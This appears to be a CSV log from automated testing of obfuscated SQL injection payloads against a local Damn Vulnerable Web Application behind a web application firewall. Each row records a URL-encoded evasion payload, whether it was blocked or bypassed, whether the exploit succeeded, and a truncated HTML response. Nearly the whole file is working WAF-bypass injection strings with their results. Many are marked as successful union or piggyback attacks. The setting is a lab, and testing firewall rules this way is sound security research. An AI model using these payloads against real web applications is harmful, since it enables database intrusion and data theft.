Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=.1%0b||%0bnot%0b{x%0b(select+1)}=1=+(not+{x+(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0349,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0b||%0bnot%0b{x%0b(select+1)}=1=+(not%0b{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0272,70.59,No,500,
0%27<@=.1%0bor%0b!%0b{x+(select%0b1)}=1=+(not%0b{x+(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0226,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27or+@<@.%0bor+!+{`if`%0b1}=1=%0b(not%0b{x+(select%0b1)}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0291,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or%0bnot+{a+1}=1=+(not%0b{x%0b(select+1)}=1)+,Bypassed,No,None,Unknown,0.0234,70.59,No,500,
0'<@=.1+or+not+{x+(select+1)}=1=+(!%0b{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.0314,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+or+not+{x%0b(select+1)}=1=%0b(!%0b{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0262,70.59,No,500,
0'<@!=1.+or%0bnot+1=+(not%0b{`if`+1}=1)+or',Bypassed,No,None,Unknown,0.0288,70.59,No,500,
0%27<@=.1%0b||%0b!+{x%0b(select%0b1)}=1=%0b(not%0b{`if`+1}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0414,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0bor%0b!+1=+(not+{`if`%0b1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.026,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||%0b!%7efalse=+(not%0b{a+1}=1)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.031,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||+not%7efalse=%0b(not%0b{x%0b(select+1)}=1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0221,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or+not%7efalse=+(!+{x+(select%0b1)}=1)%0b||%27,Bypassed,No,None,booleanAtk,0.0262,70.59,No,500,
0%27<@!=1%0bor+!+{a+1}=1=%0b(!%7efalse)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0259,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||+!%0b{x%0b(select%0b1)}=1=+(not+{a%0b1}=1)--,Bypassed,No,None,piggyAtk,0.0273,70.59,No,500,
0'<@!=1+||+not%7efalse=%0b(!~0)+||',Bypassed,No,None,Unknown,0.0185,70.59,No,500,
0%27<@!=.1+or+not+{x+(select+1)}=1=+(!%0b{a+1}=1)+,Blocked,No,None,Unknown,0.0131,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+or+{x+(select+1)}=1+like%0b{x+(select%0b1)}=1+or%27,Blocked,No,None,Unknown,0.0223,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+||+!+{`if`%0b1}=1=%0b(!+{x%0b(select+1)}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0124,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or%0bnot+{`if`+1}=1=+(!%0b{a+1}=1)+or',Bypassed,No,None,Unknown,0.026,70.59,No,500,
0'<@=1.%0b||%0b0=%0b(0)%23,Bypassed,No,None,piggyAtk,0.0174,70.7,No,500,
0%27<@=1+or+!%0b{`if`+1}=1=%0b(0)+or',Bypassed,No,None,Unknown,0.0285,70.82,No,500,
0%27<@=.1+||+not%0b{`if`%0b1}=1=+(not+{x+(select+1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0212,70.82,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or%0b!~0=%0b(not%0b{x%0b(select%0b1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0277,71.12,No,500,
0%27<@!=.1+or+not%0b{x+(select+1)}=1=+(not+1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.042,71.41,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||%0b!+{`if`+1}=1=%0b(not%0b{x%0b(select+1)}=1)%0b,Bypassed,No,None,Unknown,0.0474,71.41,No,500,
0'<@!=1.+or+!%0b1=%0b(!+{x+(select+1)}=1)+||%27,Blocked,No,None,Unknown,0.0204,71.41,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+or%0bnot%0btrue=+(not+{x+(select%0b1)}=1)+||',Bypassed,No,None,booleanAtk,0.0334,71.41,No,500,
0'<@!=.1+or%0b{x+(select+1)}=1+like%0b{x%0b(select%0b1)}=1--+,Bypassed,No,None,piggyAtk,0.019,71.41,No,500,
0'<@=1%0bor%0b!+{`if`%0b1}=1=%0b(!%0b{a%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.0351,71.41,No,500,
0'<@=1.+||%0bnot+{x%0b(select+1)}=1=+(!%0b{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0157,69.59,No,500,
0'<@!=.1+||%0bnot+{x+(select+1)}=1=+(!+{x+(select%0b1)}=1),Blocked,No,None,Unknown,0.0232,70.17,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+or+!+{x+(select+1)}=1=+(!%0b{a+1}=1)--,Blocked,No,None,piggyAtk,0.015,70.17,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0b||%0bnot+{`if`+1}=1=%0b(!%0b{x+(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0228,70.17,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+!%0b{x+(select%0b1)}=1=+(not+{`if`+1}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0204,70.17,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or%0b!+{x+(select+1)}=1=+(!+{a+1}=1)+,Blocked,No,None,Unknown,0.0141,70.17,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+or%0bnot%7efalse=%0b(!+{`if`+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0248,70.17,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor%0b{x+(select+1)}=1+like+{x+(select%0b1)}=1+||',Bypassed,No,None,Unknown,0.0203,70.17,No,500,
0'<@!=.1+or%0b!%0b{x%0b(select%0b1)}=1=+(not+{a%0b1}=1)%23,Blocked,No,None,piggyAtk,0.0122,70.3,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0b||+!%0b{x+(select+1)}=1=+(!%0b{x+(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0244,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||%0bfalse=+(!%0b{a%0b1}=1)+or',Bypassed,No,None,booleanAtk,0.0188,70.59,No,500,
0%27<@!=1%0b||%0bnot+{x+(select%0b1)}=1=+(not%0b{x+(select%0b1)}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0233,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0bor+!+true=%0b(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.028,70.59,No,500,
0%27<@=1.+||+not%0b{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0327,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor%0b!%0btrue=+(not+{x%0b(select%0b1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0318,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor%0bnot~false=+(not+{x%0b(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0485,70.59,No,500,
0%27<@!=.1%0b||+!+{a+1}=1=+(!+true)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0169,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0b||%0b!%0b{x%0b(select+1)}=1=%0b(!~0)+||',Bypassed,No,None,Unknown,0.0398,70.59,No,500,
0%27<@=1.%0bor+not+{x%0b(select+1)}=1=+(not%0b{a+1}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0224,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+not+{x+(select%0b1)}=1=%0b(not+1)+or%27,Blocked,No,None,Unknown,0.0111,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1+or%0b!%0b{`if`%0b1}=1=%0b(!%7efalse)%0b||',Bypassed,No,None,booleanAtk,0.0314,70.59,No,500,
0%27<@=1.+or+not+{a%0b1}=1=+(not%7efalse)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0238,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor%0bnot+{x+(select+1)}=1=%0b(!+{a+1}=1)+,Bypassed,No,None,Unknown,0.0262,70.59,No,500,
0%27<@!=1.%0b||%0b!~false+is%0bfalse--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0355,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
